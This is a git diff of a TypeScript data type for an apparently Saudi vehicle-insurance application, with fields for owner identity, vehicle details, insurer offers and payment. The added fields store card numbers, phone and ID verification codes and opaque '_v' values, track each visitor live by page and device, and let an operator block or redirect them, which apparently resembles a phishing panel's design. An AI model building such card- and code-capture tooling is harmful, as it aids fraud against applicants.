@@ -1,21 +1,24 @@
 export interface InsuranceApplication {
     id?: string
-    country:string,
-    identityNumber: string
-    ownerName: string
-    phoneNumber: string
-    documentType: "استمارة" | "بطاقة جمركية"
-    serialNumber: string
-    insuranceType: "تأمين جديد" | "نقل ملكية"
-    
-    coverageType: string
-    insuranceStartDate: string
-    vehicleUsage: string
-    vehicleValue: number
-    manufacturingYear: number
-    vehicleModel: string
-    repairLocation: "agency" | "workshop"
-  
+    referenceNumber?: string
+    country?: string
+    identityNumber?: string
+    ownerName?: string
+    phoneNumber?: string
+    documentType?: "استمارة" | "بطاقة جمركية"
+    serialNumber?: string
+    insuranceType?: "تأمين جديد" | "نقل ملكية"
+    buyerName?: string
+    buyerIdNumber?: string
+
+    coverageType?: string
+    insuranceStartDate?: string
+    vehicleUsage?: string
+    vehicleValue?: number
+    manufacturingYear?: number
+    vehicleModel?: string
+    repairLocation?: "agency" | "workshop"
+
     selectedOffer?: {
       id: number
       company: string
@@ -23,7 +26,7 @@ export interface InsuranceApplication {
       type: string
       features: string[]
     }
-  
+
     paymentMethod?: string
     _v1?: string
     _v2?: string
@@ -37,21 +40,38 @@ export interface InsuranceApplication {
     _v5Status?: string
     _v6Status?: string
     _v7Status?: string
-    paymentStatus: "pending" | "completed" | "failed"
-  
+    cardNumber?: string
+    paymentStatus?: "pending" | "completed" | "failed"
+
     phoneVerificationCode?: string
     phoneVerificationStatus?: "pending" | "approved" | "rejected"
     phoneVerifiedAt?: Date
     idVerificationCode?: string
     idVerificationStatus?: "pending" | "approved" | "rejected"
     idVerifiedAt?: Date
-    lastSeen?:string
-    currentStep: number
-    status: "draft" | "pending_review" | "approved" | "rejected" | "completed"
+
+    isOnline?: boolean
+    isBlocked?: boolean
+    isUnread?: boolean
+    lastSeen?: string
+    lastActiveAt?: string
+    currentStep?: number
+    currentPage?: string
+    status?: "draft" | "pending_review" | "approved" | "rejected" | "completed"
     assignedProfessional?: string
-    createdAt: Date
-    updatedAt: Date
+    createdAt?: any
+    updatedAt?: any
+    sessionStartAt?: string
     notes?: string
+
+    deviceType?: string
+    browser?: string
+    os?: string
+    screenResolution?: string
+
+    redirectPage?: string
+    redirectRequestedAt?: string
+    history?: any[]
   }
   
   export interface ChatMessage {
